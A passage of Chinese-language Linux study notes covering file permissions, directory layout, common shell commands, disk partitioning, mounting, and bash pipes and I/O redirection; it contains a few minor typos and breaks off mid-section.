href="#2-1-4-目录与文件的权限不同" class="headerlink" title="2.1.4 目录与文件的权限不同"></a>2.1.4 目录与文件的权限不同</h5><ul><li>Linux下一个文件到底能不能执行，跟后面的扩展名没有关系，而是具不具备x权限</li></ul><table><thead><tr><th>组件</th><th>内容</th><th>r</th><th>w</th><th>x</th></tr></thead><tbody><tr><td>文件</td><td>详细数据</td><td>读到文件内容</td><td>修改文件内容</td><td>执行文件内容</td></tr><tr><td>目录</td><td>文件名</td><td>读到文件名</td><td>修改文件名</td><td>进入该目录的权限</td></tr></tbody></table><h4 id="2-2-Linux目录介绍"><a href="#2-2-Linux目录介绍" class="headerlink" title="2.2 Linux目录介绍"></a>2.2 Linux目录介绍</h4><h5 id="2-2-1-简单区别"><a href="#2-2-1-简单区别" class="headerlink" title="2.2.1 简单区别"></a>2.2.1 简单区别</h5><table><thead><tr><th></th><th>可分享</th><th>不可分享</th></tr></thead><tbody><tr><td>不变（static）</td><td>/usr（软件存放处）</td><td>/etc（配置文件）</td></tr><tr><td></td><td>/opt（第三方辅助软件）</td><td>/boot（启动与内核文件）</td></tr><tr><td>可变动（variable）</td><td>/var/mail（用户邮箱）</td><td>/var/run（程序相关）</td></tr><tr><td></td><td>/var/spool/news（新闻组）</td><td>/var/lock（程序相关）</td></tr></tbody></table><h5 id="2-2-2-具体目录"><a href="#2-2-2-具体目录" class="headerlink" title="2.2.2 具体目录"></a>2.2.2 具体目录</h5><h4 id="2-3-目录概念及相关讲解"><a href="#2-3-目录概念及相关讲解" class="headerlink" title="2.3 目录概念及相关讲解"></a>2.3 目录概念及相关讲解</h4><h5 id="2-3-1-目录与路径"><a href="#2-3-1-目录与路径" class="headerlink" title="2.3.1 目录与路径"></a>2.3.1 目录与路径</h5><ul><li>相对路径：相对于当前目录写起</li><li>绝对路径：从根目录写起</li></ul><h5 id="2-3-2-目录的相关操作"><a href="#2-3-2-目录的相关操作" class="headerlink" title="2.3.2 目录的相关操作"></a>2.3.2 目录的相关操作</h5><table><thead><tr><th>目录</th><th>代表</th></tr></thead><tbody><tr><td>.</td><td>当前目录</td></tr><tr><td>..</td><td>上一层目录</td></tr><tr><td>-</td><td>前一个工作目录</td></tr><tr><td>~</td><td>目前使用者所在的家目录</td></tr><tr><td>~account</td><td>代表account这个使用者的家目录</td></tr></tbody></table><h5 id="2-3-3-执行文件路径的变量：-PATH"><a href="#2-3-3-执行文件路径的变量：-PATH" class="headerlink" title="2.3.3 执行文件路径的变量：$PATH"></a>2.3.3 <u><strong>执行文件路径的变量：$PATH</strong></u></h5><p>path 变量由一堆目录组成，每个目录用“<strong>:</strong>”隔开</p><ul><li>将一个目录加入系统环境变量：<strong><code>PARH = &quot; ${PATH}:/目录名（绝对路径）&quot;</code></strong>`</li><li>不建议将本目录“.”加入路径（很危险）</li></ul><h5 id="2-3-4-处理目录的命令"><a href="#2-3-4-处理目录的命令" class="headerlink" title="2.3.4 处理目录的命令"></a>2.3.4 处理目录的命令</h5><ul><li><code>cd</code> ：切换目录 （配合上面的目录代表符号）</li><li><code>pwd  [-p]</code>：显示当前目录（-p显示真正的目录而不是链接）</li><li><code>mkdir  [-m  -p]</code>：建立一个新目录（-m设置权限，-p进行递归创建）</li><li><code>rmdir [-p]</code>：删除一个<strong>空</strong>目录（-p递归删除）</li><li><code>basename</code>：获取文件名</li><li><code>dirname</code>：获取目录</li></ul><h4 id="2-4-常用命令及介绍"><a href="#2-4-常用命令及介绍" class="headerlink" title="2.4 常用命令及介绍"></a>2.4 <strong><u>常用命令及介绍</u></strong></h4><h5 id="ls、cp、rm、mv"><a href="#ls、cp、rm、mv" class="headerlink" title="ls、cp、rm、mv"></a><code>ls、cp、rm、mv</code></h5><ul><li><code>ls -aAdfFhilnrRSt</code>  文件名或目录</li><li><code>cp -adfilprsu</code>  源文件  目标文件</li><li><code>rm -fir</code>  文件或目录</li><li><code>mv -fiu  source1  source2  source3  ...  directory</code></li><li><code>file</code> ：显示文件类型（d - c s p l b )</li></ul><table><thead><tr><th>命令</th><th>介绍</th><th>可带参数</th></tr></thead><tbody><tr><td>ls</td><td>查看</td><td>-a：显示所有文件；-d：仅列出目录本身；-l：详细信息显示（可以使用alias转换别名）</td></tr><tr><td>cp</td><td>复制</td><td>-a：文件的权限信息都复制；-i：覆盖前进行询问；-p：连同属性（权限、用户、时间）一起复制（不使用默认的）；-r：递归复制；-l：硬链接；-s：软连接；-b：新复制的文件名后加～</td></tr><tr><td>rm</td><td>删除</td><td>-f：强力删除文件；-I：删除前询问；-r：递归删除（很危险）</td></tr><tr><td>mv</td><td>移动(重命名)</td><td>-f：强制移动；-i：询问是否覆盖；-u：更新文件；-b ：先对原文件备份～；-t：将多个文件移动到一个目录（mv  -t  目录 文件1  文件2）</td></tr><tr><td>file</td><td>查看类型</td><td>-b：显示结果时，不显示文件名；-c：显示file是如何判断文件类型的；-i：输出mime类型的字符串；-z：显示压缩文件的内容；-L：查看软连接对应的文件类型；-f：查看文件中文件名的类型</td></tr></tbody></table><h5 id="cat：查看文件内容-tac：逆向查看文件（从最后开始）"><a href="#cat：查看文件内容-tac：逆向查看文件（从最后开始）" class="headerlink" title="cat：查看文件内容    tac：逆向查看文件（从最后开始）"></a><code>cat</code>：查看文件内容    tac：逆向查看文件（从最后开始）</h5><table><thead><tr><th>命令</th><th>可用参数</th><th>使用说明</th></tr></thead><tbody><tr><td>cat</td><td>-A = -vET</td><td>其他命令的集合</td></tr><tr><td></td><td>-b；-n</td><td>列出行号（仅列出有字的）；列出行号（包含空白行）</td></tr><tr><td></td><td>-E；-v；-T</td><td>显示换行符$；显示特殊字符；用^I显示[tab]</td></tr><tr><td>cat  &gt;  文件名 &lt;&lt;EOF</td><td>输出重定向</td><td>将键盘输入的内容添加的文件中，以输入EOF为结束</td></tr><tr><td>cat  &gt;&gt; 文件名 &lt;&lt;EOF</td><td>追加重定向</td><td>向文件中追加数据，以输入EOF为结束</td></tr><tr><td>cat 文件1  文件2  &gt;   文件3</td><td>合并重定向</td><td>将文件1 文件2 的内容合并到文件3中</td></tr></tbody></table><h5 id="nl：添加行号打印"><a href="#nl：添加行号打印" class="headerlink" title="nl：添加行号打印"></a><code>nl</code>：添加行号打印</h5><table><thead><tr><th>命令</th><th>可用参数</th><th>使用说明</th></tr></thead><tbody><tr><td>nl</td><td>-b  a;  -b  t</td><td>全部列出行号；空行不列出行号</td></tr><tr><td></td><td>-n  ln;-n  rn;-n  rz</td><td>行号在最左方显示；行号在最右方显示且不加0；行号在最右方显示且加0</td></tr><tr><td></td><td>-w</td><td>行号栏位占用的字符数</td></tr></tbody></table><h5 id="more-与less-：查看文件-（一页一页查看）（常在管道中使用）"><a href="#more-与less-：查看文件-（一页一页查看）（常在管道中使用）" class="headerlink" title="more 与less ：查看文件 （一页一页查看）（常在管道中使用）"></a><code>more</code> 与<code>less</code> ：查看文件 （一页一页查看）（常在管道中使用）</h5><table><thead><tr><th>命令</th><th>按键</th></tr></thead><tbody><tr><td>more</td><td>空格键：向下翻页(屏)；Ctrl+ f：向下翻一页(屏)；enter：向下翻一行；/字符串：查找字符串；:f ：显示文件名以及目前的行数；b：往回翻页；q：立即离开</td></tr><tr><td></td><td>v：调用vi编辑器；!command：调用shell命令（与在命令行一样）</td></tr><tr><td></td><td>+ number  ：从第几行显示文件</td></tr><tr><td>less</td><td>空格键：向下翻页；[page down ]：向下翻页；[page up]：向上翻页；/字符串：向下查找；?字符串：向上查找；n：重复前一个查找；N：反向重复前一个查找；g：前进到这个数据的第一行；G：前进到这个数据的最后一行；q：离开</td></tr><tr><td></td><td></td></tr></tbody></table><h5 id="head-tail-：查看n行"><a href="#head-tail-：查看n行" class="headerlink" title="head /tail  ：查看n行"></a><code>head /tail</code>  ：查看n行</h5><table><thead><tr><th>命令</th><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>head（从前开始）</td><td>-数字  number  文件名</td><td>显示（数字）行(默认是10行)</td></tr><tr><td>tail （反向）</td><td>-数字  number  文件名</td><td>显示（数字）行</td></tr><tr><td></td><td>-f  number</td><td>持续刷新文件的内容</td></tr></tbody></table><h5 id="od-：查看非文本文件的的内容"><a href="#od-：查看非文本文件的的内容" class="headerlink" title="od ：查看非文本文件的的内容"></a><code>od</code> ：查看非文本文件的的内容</h5><ul><li>-t    a：默认字符；</li><li>-t    c：ascii码；    C（放在type中间进行数制的对比）  </li><li>-t    d[size]：利用十进制输出，每个整数用size bytes    例：od  -t  oCc  文件名  </li><li>-t     f[size]：浮点数制</li><li>-t     o[size]：八进制</li><li>-t     x[size]：、八进制、十六进制</li></ul><h5 id="mkdir-：创建目录"><a href="#mkdir-：创建目录" class="headerlink" title="mkdir ：创建目录"></a><code>mkdir</code> ：创建目录</h5><ul><li>-m：设置权限     //不设置这个参数时，默认权限是 755</li><li>-p ：递归创建</li><li>-v ：显示</li><li>mkdir   -p   a/{b,c,d}   ：递归创建a目录，在a目录下创建b，c，d同级目录（使用花括号的作用）</li><li>mkdir  -p  {a,b}-{c,d}    ：会创建a-c,b-c,a-d,b-d等4个目录</li></ul><h5 id="touch：创建新文件或修改文件时间："><a href="#touch：创建新文件或修改文件时间：" class="headerlink" title="touch：创建新文件或修改文件时间："></a><code>touch</code>：创建新文件或修改文件时间：</h5><ul><li>-a ： 修改访问时间  </li><li>-c ：不会创建文件，仅修改文件的时间  </li><li>-d ：用指定的日期创建/修改新文件的日期，不使用系统时间    </li><li>-t  ：用指定格式的时间戳创建新文件，不使用系统时间    </li><li>-m ：修改mtime</li></ul><p>*<em>注意：mkdir和touch创建的目录或文件的权限受到 umask的影响，详细信息查看 2.5.1 *</em></p><h5 id="tree-：（-ls-R）查看目录树"><a href="#tree-：（-ls-R）查看目录树" class="headerlink" title="tree ：（= ls -R）查看目录树"></a><code>tree</code> ：（= ls -R）查看目录树</h5><h5 id="which-：查找命令所在路径"><a href="#which-：查找命令所在路径" class="headerlink" title="which ：查找命令所在路径"></a><code>which</code> ：查找命令所在路径</h5><ul><li>[-a]：找出所有的而不仅仅是第一个</li></ul><h5 id="whereis：查找命令所在路径、源代码文件、帮助信息文件所在的目录"><a href="#whereis：查找命令所在路径、源代码文件、帮助信息文件所在的目录" class="headerlink" title="whereis：查找命令所在路径、源代码文件、帮助信息文件所在的目录"></a><code>whereis</code>：查找命令所在路径、源代码文件、帮助信息文件所在的目录</h5><ul><li><p>-b  ：查找命令所在路径</p></li><li><p>-s   ：源代码文件</p></li><li><p>-m ：只显示帮助信息所在的位置</p></li></ul><h5 id="locate-locatedb：建立数据库，方便快速查找"><a href="#locate-locatedb：建立数据库，方便快速查找" class="headerlink" title="locate/locatedb：建立数据库，方便快速查找"></a><code>locate/locatedb</code>：建立数据库，方便快速查找</h5><ul><li>updatedb</li><li>locate  [文件或命令]</li></ul><h5 id="find-：查找文件"><a href="#find-：查找文件" class="headerlink" title="find ：查找文件"></a><code>find</code> ：查找文件</h5><ul><li>find   [path]   [option]  [option]</li><li>-exec    …   ;</li></ul><h4 id="2-5-文件的隐藏属性"><a href="#2-5-文件的隐藏属性" class="headerlink" title="2.5 文件的隐藏属性"></a><strong>2.5 文件的隐藏属性</strong></h4><h5 id="2-5-1-默认属性查看：umask"><a href="#2-5-1-默认属性查看：umask" class="headerlink" title="2.5.1　默认属性查看：umask"></a>2.5.1　默认属性查看：<code>umask</code></h5><ul><li>里面的数字代表需要减掉的权限（默认是022）</li><li>umask  022 ：代表只拿掉其他人的w权限</li></ul><h5 id="2-5-2-隐藏属性的查看及修改-chattr"><a href="#2-5-2-隐藏属性的查看及修改-chattr" class="headerlink" title="2.5.2　隐藏属性的查看及修改  chattr"></a>2.5.2　隐藏属性的查看及修改  <code>chattr</code></h5><ul><li><p><code>chattr</code>  配置文件的默认属性</p></li><li><p>chattr  [+-=]  [ASacdistu]  文件或目录</p></li></ul><p>第二参数介绍：</p><ul><li>A：不修改atime</li><li>a：文件只能增加数据，不能删除数据【root】</li><li>i ：不能增加、删除、改名、设置链接、写入【root】</li><li>s：删除时会彻底删除，不能恢复<ul><li>u：与s相反</li></ul></li></ul><ul><li><p><code>lsattr</code> 显示文件隐藏属性</p><ul><li><code>lsattr -[adR]</code>  文件或目录</li><li>-a：将隐藏文件的隐藏属性也显示</li><li>-d：如果后面接目录，仅将目录的属性显示，不显示里面的文件的</li><li>-R：与-d相反，递归显示子目录的数据属性</li></ul></li><li><p><strong>/、 /dev/ 、 /tmp/ 、 /var/ 、 /etc/  不受chattr保护</strong>   </p></li></ul><h5 id="2-5-3-文件的特殊权限：SUID、SGID、SBIT"><a href="#2-5-3-文件的特殊权限：SUID、SGID、SBIT" class="headerlink" title="2.5.3　文件的特殊权限：SUID、SGID、SBIT"></a>2.5.3　文件的特殊权限：<code>SUID、SGID、SBIT</code></h5><h3 id="3-磁盘与文件系统"><a href="#3-磁盘与文件系统" class="headerlink" title="3. 磁盘与文件系统"></a>3. 磁盘与文件系统</h3><h4 id="3-1-磁盘"><a href="#3-1-磁盘" class="headerlink" title="3.1 磁盘"></a>3.1 磁盘</h4><h5 id="3-1-1-磁盘组成结构："><a href="#3-1-1-磁盘组成结构：" class="headerlink" title="3.1.1 磁盘组成结构："></a>3.1.1 磁盘组成结构：</h5><ul><li>盘片：存储时每个盘片平均存储（如有100k数据存储在4盘片的磁盘上，则每个盘片存储25k）</li><li>磁头、轴、马达</li></ul><h5 id="3-1-2-磁盘逻辑结构"><a href="#3-1-2-磁盘逻辑结构" class="headerlink" title="3.1.2 磁盘逻辑结构"></a>3.1.2 磁盘逻辑结构</h5><ul><li>磁道：盘片以轴为中心组成的同心圆</li><li>扇区：磁道被分为多个扇区</li><li>柱面：不同盘片上相同编号的磁道组成柱面</li></ul><h5 id="3-1-3-磁盘延时"><a href="#3-1-3-磁盘延时" class="headerlink" title="3.1.3  磁盘延时"></a>3.1.3  磁盘延时</h5><ul><li>因磁头不能立刻到达目的位置，移动时会有延迟</li><li>磁头悬浮在盘片上</li></ul><h5 id="3-1-4-磁盘分区格式化"><a href="#3-1-4-磁盘分区格式化" class="headerlink" title="3.1.4  磁盘分区格式化"></a>3.1.4  磁盘分区格式化</h5><p>常见文件系统：FAT32  NTFS  EXT2  EXT3  EXT4  XFS等（内核的功能）</p><ul><li>低级格式化：</li><li>高级格式化：分区装入文件系统</li><li>MBR：主引导记录，位于0磁道0柱面1扇区，512字节，分为3部分<ul><li><strong>446字节的<code>boot loader</code></strong>（启动加载器，存放引导代码）</li><li><strong>64字节磁盘分区表</strong></li><li><strong>2字节<code>majic  number</code></strong>（检查MBR是否有效）</li></ul></li><li>主分区（最多4个）：<strong>主分区+扩展分区 &lt;= 4</strong><ul><li>扩展分区：16字节，只能有一个，扩展分区是一个指针，指向磁盘另外的位置，不能直接存储数据</li><li>逻辑分区：多的只能是逻辑分区</li></ul></li></ul><h4 id="3-2-文件系统"><a href="#3-2-文件系统" class="headerlink" title="3.2  文件系统"></a>3.2  文件系统</h4><p>文件系统：一套软件（XFS、NTFS、FAT、EXT3、EXT4等），存储数据或文件的一种格式，文件系统不存在于分区上，位于磁盘的某一个位置；文件系统把分区分割成两部分，一部分存放元数据，另一部分存放真正的数据</p><h5 id="3-2-1特性："><a href="#3-2-1特性：" class="headerlink" title="3.2.1特性："></a>3.2.1特性：</h5><ul><li><p>matedata ：元数据（与数据本身并没有关系，包括的是数据属性，比如数据归属，数据权限，数据的时间戳）</p></li><li><p>iNode：（index node）记录文件的属性，一个文件占用一个iNode，同时记录此文件的数据所在的区块号码</p></li><li><p>超级区块（super block）：记录此文件系统的整体信息，包括iNode与数据区块的总量、使用量、剩余量，以及文件系统的格式与相关信息。</p></li><li><p>数据区块（block）：实际记录文件的内容，若文件过大时，会占用多个区块。</p></li><li><p>block bitmap：在元数据区域，标记数据块是否被使用</p></li><li><p>读取规则：用户读取文件时，先找到文件的iNode，然后分析iNode所记录的权限与用户是否符合，若符合才能够读取文件内容</p></li></ul><h5 id="3-2-2-文件操作"><a href="#3-2-2-文件操作" class="headerlink" title="3.2.2  文件操作"></a>3.2.2  文件操作</h5><ul><li>删除文件：把数据对应的inode和block的值变为0，实际数据并没有删除</li><li>新建文件：</li><li>复制文件：重新建立新文件（新建inode等）</li><li>移动文件：改变inode和block的值，对数据没有操作（在同一个文件系统中是这样，若为不同文件系统，则会创建新文件然后删除旧文件）</li><li>链接文件：<ul><li>创建语法：<code>ln [-s  -v]  src_file  dst_file</code>    不加任何参数就是创建硬链接<ul><li>-s  ：创建软连接</li><li>-v  ：显示详细过程</li></ul></li><li>硬链接：  inode相同，指向的是同一个数据文件（同一个inode可以指向多个文件）源文件被删除时，不会影响到新文件（只能在文件系统中进行硬链接，<strong>只能对文件进行硬链接</strong>）</li><li>软连接： <code>ln  -s</code>：<strong>注意必须使用绝对路径</strong>，指向的是一个路径，文件大小是字符串（路径）的个数，源文件被删除时，会影响新文件，因为新文件指向的是一个路径，路径中的那个文件没有了自然会受到影响。（方便跨文件系统，可对目录操作）<ul><li>注意：删除软连接目录时，不要在最后加 <code>/</code></li></ul></li></ul></li></ul><h4 id="3-3-设备文件-dev"><a href="#3-3-设备文件-dev" class="headerlink" title="3.3  设备文件  /dev/"></a>3.3  设备文件  /dev/</h4><p><code>mknod  [option] NAME TYPE [MAJOR  MINOR]</code>：创建设备</p><ul><li>-m  设置权限  </li></ul><h5 id="3-3-1-块设备：b"><a href="#3-3-1-块设备：b" class="headerlink" title="3.3.1  块设备：b"></a>3.3.1  块设备：b</h5><img src="F:\Individual File\于召勇\typora note\Linux及编程\image-linux\设备文件.png" style="zoom:60%;" /><ul><li>左边那列  （MAJOR）8  代表主设备号</li><li>右边那列（MINOR） 1，2 ，3 代表次设备号，次设备号分别代表分区</li></ul><p>接口标识：IDE  ATA  :  hd  、  SATA  :  sd  、SCSI  :  sd  、USB  :  sd</p><p>Linux以<strong>字母</strong>标识磁盘的个数：a：第一块、b：第二块  ……</p><p>Linux用<strong>数字</strong>标识分区：1-4 标识主分区，逻辑分区从5开始</p><h5 id="3-3-2-字符设备：c"><a href="#3-3-2-字符设备：c" class="headerlink" title="3.3.2  字符设备：c"></a>3.3.2  字符设备：c</h5><h4 id="3-4-格式化"><a href="#3-4-格式化" class="headerlink" title="3.4  格式化"></a>3.4  格式化</h4><ul><li>低级格式化：划分磁道</li><li>高级格式化：为分区装载文件系统</li><li>文件系统：内核功能。常见：FAT32 NTFS EXT2 EXT3 EXT4 XFS等</li><li>mkfs ：（make file system） 创建文件系统（格式化）<ul><li>-t:指定文件系统</li><li><code>mkfs  -t  ext3  dev_name</code></li></ul></li></ul><p>VFS ：虚拟文件系统。Linux内核的内容，类似于一个库，在这一<strong>层</strong>上兼容  其他的文件系统</p><h5 id="3-4-1-命令"><a href="#3-4-1-命令" class="headerlink" title="3.4.1  命令"></a>3.4.1  命令</h5><ul><li><p>fdisk：针对MBR分区类型的工具</p><ul><li><p>fdisk -l  查看磁盘列表、<code>cat /proc/partitons</code>也可以查看设备及分区 </p></li><li><p>fdisk  /dev/sda  ：会进入<strong>fdisk的交互模式</strong></p><ul><li>d:删除一个分区</li></ul></li></ul></li><li><p>1:显示linux支持的分区类型（磁盘ID）</p><ul><li><p>5:扩展分区</p></li><li><p>82:交换分区</p><ul><li>83: linux系统分区</li></ul></li><li><p>8e: LVM 逻辑卷管理</p><ul><li>m:显示帮助信息</li></ul></li></ul></li><li><p>n:创建一个新分区</p><ul><li>p:创建主分区</li></ul></li><li><p>e:创建扩展分区</p><ul><li>p:显示当前分区列表</li></ul></li><li><p>q:不保存退出</p><ul><li>w:保存更改并退出</li></ul></li><li><p>t:更改分区的系统ID</p></li></ul><p>Centos6:按照柱面分区</p><p>Centos7:按照扇区分区|</p><ul><li>gdisk：针对GPT分区类型的工具<ul><li><strong>强制使用gpt安装：在点击install centos linux 7之前，按 tab键，然后在下面输入  inst.gpt，然后回车，即可强制使用gpt格式安装。</strong></li></ul></li></ul><h4 id="3-5-挂载"><a href="#3-5-挂载" class="headerlink" title="3.5 挂载"></a>3.5 挂载</h4><h5 id="3-5-1-命令"><a href="#3-5-1-命令" class="headerlink" title="3.5.1 命令"></a>3.5.1 命令</h5><ul><li><p><code>mount</code>：显示系统中挂载的所有设备  </p></li><li><p><code>mount dev_name /path</code>：path必须是空文件夹  </p></li><li><p><code>blkid</code>：查看设备的UUID 号</p></li><li><p>mkswap ：创建swap交换分区</p><ul><li>swapon   dev_name：开启某个分区</li><li>swapoff   dev_name：关闭某个分区</li></ul></li></ul><h5 id="3-5-2-开机自动挂载"><a href="#3-5-2-开机自动挂载" class="headerlink" title="3.5.2 开机自动挂载"></a>3.5.2 开机自动挂载</h5><ul><li><p>/etc/fstab文件：修改这个文件即可实现开机挂载</p><p>UUID    挂载点    type(文件系统)    default   0(是否检查)  0(是否备份)</p></li></ul><h5 id="3-5-3-卸载"><a href="#3-5-3-卸载" class="headerlink" title="3.5.3 卸载"></a>3.5.3 卸载</h5><ul><li><code>umonut dev_name</code></li></ul><h3 id="4-shell"><a href="#4-shell" class="headerlink" title="4.shell"></a>4.shell</h3><ul><li>shell启动后—&gt;&gt;进程：使用PID号进行区分，（在系统中，一个进程只认为自己存在）</li><li>父shell与子shell相互独立（父子shell之间环境相互独立）</li><li><code>cat  /etc/shells/</code>：查看当前系统所支持的shell程序</li></ul><h4 id="4-1bash特性："><a href="#4-1bash特性：" class="headerlink" title="4.1bash特性："></a>4.1bash特性：</h4><h5 id="4-1-1命令历史：-bash-history"><a href="#4-1-1命令历史：-bash-history" class="headerlink" title="4.1.1命令历史：.bash_history"></a>4.1.1命令历史：.bash_history</h5><ul><li>history：<ul><li>-d：删除历史命令（history  -d  第几行(开始)    [连续几行]</li><li>-c：清空当前内存的命令历史</li><li>-w：将命令历史保存到某个文件中</li><li>使用技巧：<ul><li>!n：执行命令历史中的第n行命令</li><li>!-n：执行命令历史中的倒数第n行命令</li><li>!word：执行命令历史中最近一次的Word命令</li><li>!!：执行上一条命令</li><li>!$：引用运行的这个命令的之前所用过的最后一个参数</li></ul></li></ul></li></ul><p>​                   ESC键（按完松开）. 键（按完松开）</p><h5 id="4-1-2-管道，IO重定向："><a href="#4-1-2-管道，IO重定向：" class="headerlink" title="4.1.2 管道，IO重定向：|"></a>4.1.2 管道，IO重定向：|</h5><ul><li>计算机体系结构：<ul><li>控制器：CPU</li><li>运算器：CPU</li><li>存储器：RAM：内存</li><li>输入设备：（input）：键盘、鼠标</li><li>输出设备：（output）：屏幕、打印机</li></ul></li><li>计算机总线：<ul><li>地址总线：负责内存寻址</li><li>数据总线：负责传输数据</li><li>控制总线：负责控制指令</li></ul></li><li>寄存器：CPU中内部临时存储空间</li><li>I/O设备：负责计算机内部存储设备和外部存储设备（硬盘、光盘）</li><li>程序：指令+数据<ul><li>指令：有程序提供，负责加工数据</li><li>数据：系统中数据可以有多个数据来源，比如来自变量、文件、输入设备</li></ul></li><li>标准输入输出设备：<ul><li>标准输入设备：键盘（stdin），文件描述符：0</li><li>标准输出设备：显示器（stdout），文件描述符：1</li><li>标准错误输出设备：显示器（stderr），文件描述符：2</li></ul></li><li>三种数据流：<ul><li>标准输入数据流 / 标准输出数据流 / 标准错误输出流</li></ul></li><li>当在Linux中打开一个文件时，内核会反复调用，对于文件标识就很重要，用文件描述符来标识文件，文件加载完用数字标识 ：fd（file descriptor）</li></ul><p>IO重定向：把默认输入输出来源，重新定向到其他的文件或设备：</p><ul><li>输出重定向：<ul><li>&gt;：覆盖输出重定向</li><li>&gt;&gt;：追加输出重定向</li><li>2&gt;：错误覆盖输出重定向</li><li>2&gt;&gt;：错误追加输出重定向</li><li>&amp;&gt;：混合覆盖输出重定向</li><li>&amp;&gt;&gt;：混合追加输出重定向</li></ul></li><li>输入重定向：<ul><li>&lt;：输入重定向</li></ul></li><li><code>|</code>（管道）：连接多条命令，把前一条命令的输出结果作为后一条命令的输入条件<ul><li>格式：command1  |  command2  |  command3  |   …..</li><li>思路：北京 、河北保定、河北大学、 找  2018级 计算机系   3班  张三  （组合小程序，完成实现大功能）</li><li>tr命令：实现字符转换：tr   ’a-z‘  ’A-Z‘</li><li>tee命令：把数据重定向到给定文件和屏幕上</li><li>管道使用例子：cat  /etc/passwd  |  tr   ‘a-z’   ‘A-Z’</li></ul></li></ul><h5 id="4-1-2扩展——-重定向的具体讲解"><a href="#4-1-2扩展——-重定向的具体讲解" class="headerlink" title="4.1.2扩展—— 重定向的具体讲解"></a>4.1.2扩展—— 重定向的具体讲解</h5><h6 id="1-文件描述符"><a href="#1-文件描述符" class="headerlink" title="1.文件描述符"></a>1.文件描述符</h6><ul><li><p><strong>linux文件描述符</strong>：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。 </p></li><li><p>三个默认的文件描述符</p><ul><li>标准输入：standard input 0   （默认设备键盘）</li><li>标准输出：standard output 1（默认设备显示器）</li><li>错误输出：error output 2       （默认设备显示器）</li></ul></li><li><p><strong>注意：</strong></p><p>（1）以后再打开文件，描述符可以依次增加<br>（2）一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。</p><p>（3） 文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制） </p><p>（4） 一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。 </p><p>（5）下面的学习注意理解重定向的含义。将标准的重定向到自定义的。</p></li></ul><h6 id="2-重定向"><a href="#2-重定向" class="headerlink" title="2.重定向"></a>2.重定向</h6><ul><li><p>输入重定向 ：<code>&lt;</code>、 <code>&lt;&lt;</code></p></li><li><p>输出重定向 ：<code>&gt;</code>、 <code>&gt;&gt;</code></p></li><li><p>注意：此处涉及到shell的解析原理，仅做简单介绍</p><ul><li>bash 在执行一条指令的时候，首先<strong>会检查命令中存不存在重定向</strong>的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），<strong>然后再把重定向去掉，执行指令</strong> </li><li>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果</li><li><code>&lt;</code> 是对标准输入 0 重定向 ，<code>&gt;</code> 是对标准输出 1 重定向 </li><li>再强调一下， <strong>重定向就是针对文件描述符的操作</strong> </li></ul></li></ul><h6 id="3-输入重定向"><a href="#3-输入重定向" class="headerlink" title="3.输入重定向"></a>3.输入重定向</h6><ul><li><p>格式： <code>[n]&lt; file</code>：n是文件描述符。<strong>[]与&lt;之间没有空格</strong></p></li><li><p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开），如果n省略就是0（标准输入、键盘）</p></li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/1.png" style="zoom:80%;" /><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/1.png" style="zoom: 80%;" /><ul><li>解释：解析器解析到 “&lt;” 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。第二张图片，先定义了重定向，然后读cat文件</li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/3.png" style="zoom:50%;" /><h6 id="4-输出重定向"><a href="#4-输出重定向" class="headerlink" title="4.输出重定向"></a>4.输出重定向</h6><ul><li>格式： <code>[n]&gt; file</code></li><li>说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出） </li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/4.png" style="zoom:80%;" /><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/5.png" style="zoom:80%;" /><ul><li>第二张图同样是 先进行重定向，然后使用echo命令</li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/6.png" style="zoom: 50%;" /><h6 id="5-标准输出与标准错误输出重定向"><a href="#5-标准输出与标准错误输出重定向" class="headerlink" title="5.标准输出与标准错误输出重定向"></a>5.标准输出与标准错误输出重定向</h6><ul><li>格式： <code>&amp;&gt; word</code> 、<code>&gt;&amp; word</code> </li><li>说明：将<strong>标准输出</strong>与<strong>标准错误输出</strong>都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 <code>&gt; word 2&gt;&amp;1</code> (2&gt;&amp;1 是将标准错误输出复制到标准输出，<strong>&amp;是为了区分文件1和文件描述符1</strong>的) </li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/7.png" style="zoom:80%;" /><ul><li>解释：我们首先执行了一个错误的命令，可以看到错误提示被写入文件（正常情况下是会直接输出的），我们又执行了一条正确的指令，发现结果也输入到了文件，说明正确错误消息都能输出到文件。（<strong><code>&amp;&gt;</code>是混合错误输出重定向</strong>）</li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/8.png" style="zoom:50%;" /><h6 id="6-文件描述符的复制"><a href="#6-文件描述符的复制" class="headerlink" title="6.文件描述符的复制"></a>6.文件描述符的复制</h6><ul><li><p>格式： <code>[n]&lt;&amp;[m]</code>、<code>[n]&gt;&amp;[m]</code> <strong>(这里的所有字符之间不能有空格)</strong> </p></li><li><p>说明：</p><ul><li>这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开 </li><li>这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符 